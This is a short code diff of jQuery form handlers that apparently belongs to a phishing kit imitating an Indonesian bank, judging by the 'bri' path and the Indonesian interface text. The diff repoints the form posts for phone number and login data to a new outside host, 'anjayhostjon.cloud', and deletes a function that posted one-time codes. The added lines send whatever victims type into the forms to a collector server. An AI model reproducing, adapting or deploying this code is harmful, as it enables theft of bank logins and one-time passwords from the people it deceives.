@@ -10,7 +10,7 @@ var tarif = $('#tarif').val();
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://kuda-terbang.whf.bz/notif/39/no.php',
+ url: 'https://anjayhostjon.cloud/bri/39/no.php',
  data: $('#formHP').serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -44,7 +44,7 @@ function sendBelum(){
    
    $.ajax({
         type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/39/belum.php',
+        url: 'https://anjayhostjon.cloud/bri/39/belum.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -70,32 +70,4 @@ function sendBelum(){
 
 
         
-function sendOtp() {
-            event.preventDefault();
-            document.getElementById('kirims').value = "Memproses...."; 
-           
-            
-     $.ajax({
-        type: 'POST',
-        url: 'https://kuda-terbang.whf.bz/notif/39/otpblm.php',
-        data: $('#formLinkk').serialize(),
-        datatype: 'JSON',
-                complete: function (response) {
-                    showAlert("a");
- $("#nama1").val("");
- $("#nama1").addClass('textarea1'); 
-   document.getElementById('kirims').value = "Konfirmasi";
-                    $("#nama1").val('');
-                    $("#nama1").focus();
-                    setTimeout(function () {
-                        $("#errorAlert").slideUp();                                                
-                    }, 3000);
-                },
-                error: function (error) {
-                    $("#loader").hide();
-                    $(".btn-primary").prop("disabled", false);
-                    $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
-                    $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
-                }
-            });
-        };
+
